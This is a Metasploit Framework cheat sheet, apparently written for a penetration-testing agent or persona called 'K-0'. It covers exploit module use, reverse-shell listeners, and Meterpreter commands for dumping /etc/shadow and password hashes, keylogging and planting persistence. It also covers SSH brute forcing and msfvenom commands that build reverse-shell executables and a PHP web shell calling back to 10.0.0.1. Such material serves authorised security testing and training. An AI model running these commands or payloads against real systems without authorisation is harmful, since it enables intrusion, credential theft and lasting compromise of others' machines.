# K-0 · Metasploit Framework Reference

Metasploit is K-0's exploitation engine of last resort.
Use it when you have a confirmed vulnerability and need a reliable exploit.
Don't fire modules blindly — understand what they do first.

---

## Architecture

```
Metasploit
├── exploits/       — code that exploits a vulnerability
├── payloads/       — code that runs after exploitation
│   ├── singles/    — self-contained (no staging)
│   ├── stagers/    — small loader (fetches stage)
│   └── stages/     — full payload (meterpreter, shell)
├── auxiliaries/    — scanners, fuzzers, DoS, info gathering
├── post/           — post-exploitation modules
└── encoders/       — evade AV (mostly irrelevant now)
```

**Naming:** `exploit/platform/service/vuln_name`
Example: `exploit/linux/http/apache_mod_cgi_bash_env` (Shellshock)

---

## Essential Commands

```bash
# Start
msfconsole -q
msfdb run            # with PostgreSQL workspace

# Search
msf6> search apache rank:excellent
msf6> search type:auxiliary name:smb
msf6> search cve:2021-41773
msf6> search platform:linux type:exploit name:log4j

# Use and configure
msf6> use exploit/multi/handler
msf6> show options
msf6> set RHOSTS 10.0.0.5
msf6> set LHOST tun0        # use VPN interface for callbacks
msf6> show payloads         # see compatible payloads
msf6> set PAYLOAD linux/x64/meterpreter/reverse_tcp

# Verify before running
msf6> check                 # checks if target is vulnerable (where supported)
msf6> run                   # execute
msf6> run -j                # run as background job
```

---

## Listeners — Always Set Up First

```bash
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp   # match your exploit payload
set LHOST tun0
set LPORT 4444
set ExitOnSession false      # keep listening after getting a shell
run -j                       # background job so console stays free
jobs                         # list running jobs
sessions                     # list active sessions
sessions -i 1                # interact with session 1
```

---

## Meterpreter — Core Commands

```bash
# System info
sysinfo
getuid
getpid
ps                           # process list
getsystem                    # attempt privilege escalation

# Navigation
pwd
ls
cd /tmp
cat /etc/passwd

# File ops
download /etc/shadow
upload local_file /tmp/

# Networking
ipconfig / ifconfig
route
portfwd add -l 8080 -p 80 -r internal_host   # port forward

# Pivoting
run post/multi/manage/shell_to_meterpreter
background                   # return meterpreter to background (Ctrl+Z)
route add 10.10.10.0/24 1    # route through session 1

# Persistence (careful — leaves evidence)
run post/linux/manage/cron_persistence
run post/windows/manage/persistence_exe

# Screenshot / keylog (Windows)
screenshot
keyscan_start
keyscan_dump

# Dump credentials
run post/linux/gather/hashdump
run post/windows/gather/credentials/credential_collector
hashdump
```

---

## Useful Auxiliary Modules

```bash
# Port scanning
use auxiliary/scanner/portscan/tcp
set RHOSTS 10.0.0.0/24
set PORTS 22,80,443,445,3389,8080,8443

# SMB enumeration
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_ms17_010      # EternalBlue check

# HTTP enumeration
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/dir_scanner
use auxiliary/scanner/http/wordpress_login_enum

# SSH brute
use auxiliary/scanner/ssh/ssh_login
set RHOSTS target
set USER_FILE users.txt
set PASS_FILE rockyou.txt
set STOP_ON_SUCCESS true

# VNC auth check
use auxiliary/scanner/vnc/vnc_none_auth

# SNMP community string brute
use auxiliary/scanner/snmp/snmp_login
```

---

## Post-Exploitation Modules

```bash
# Linux
use post/linux/gather/enum_system
use post/linux/gather/enum_network
use post/linux/gather/enum_users_history
use post/linux/gather/hashdump
use post/multi/recon/local_exploit_suggester   # privesc suggestions

# Windows
use post/windows/gather/enum_domain
use post/windows/gather/credentials/credential_collector
use post/windows/gather/smart_hashdump
use post/multi/recon/local_exploit_suggester
use post/windows/gather/run_as_psh             # powershell
```

---

## Common Exploit Modules (Reference)

| CVE | Module | Target |
|-----|--------|--------|
| EternalBlue | exploit/windows/smb/ms17_010_eternalblue | Windows SMB |
| Log4Shell | exploit/multi/http/log4shell_header_injection | Log4j |
| Shellshock | exploit/multi/http/apache_mod_cgi_bash_env | Apache+Bash |
| PrintNightmare | exploit/windows/dcerpc/cve_2021_1675_printspooler | Windows Print Spooler |
| ProxyLogon | exploit/windows/http/exchange_proxylogon_rce | Exchange |
| Spring4Shell | exploit/multi/http/spring_framework_rce_spring4shell | Spring |

---

## Database & Workspace

```bash
msfdb init               # initialise PostgreSQL
msfdb start

msf6> workspace          # list workspaces
msf6> workspace -a client_name    # create workspace
msf6> workspace client_name       # switch workspace

msf6> db_nmap -sV -sC target      # scan and auto-import to DB
msf6> hosts                        # view discovered hosts
msf6> services                     # view discovered services
msf6> vulns                        # view confirmed vulns
msf6> creds                        # view captured credentials
msf6> loot                         # view downloaded files
```

---

## Payload Generation (msfvenom)

```bash
# Linux reverse shell ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf

# Windows reverse shell EXE
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe > shell.exe

# PHP web shell
msfvenom -p php/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.php

# Python
msfvenom -p python/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f raw > shell.py

# List payloads
msfvenom -l payloads | grep linux
```

---

## Metasploit Tips

- **Set LHOST to tun0** on VPN engagements — never use eth0 when on a lab VPN
- **run -j** keeps the console free while the exploit runs in the background
- **set ExitOnSession false** on the handler — otherwise it closes after first shell
- **db_nmap** saves you from re-importing scan data manually  
- **local_exploit_suggester** is very good on Linux — always run it
- **Rank matters:** Excellent > Great > Good > Normal > Average > Low — only run Excellent/Great unless no choice
- Always **check** before you shoot if the module supports it
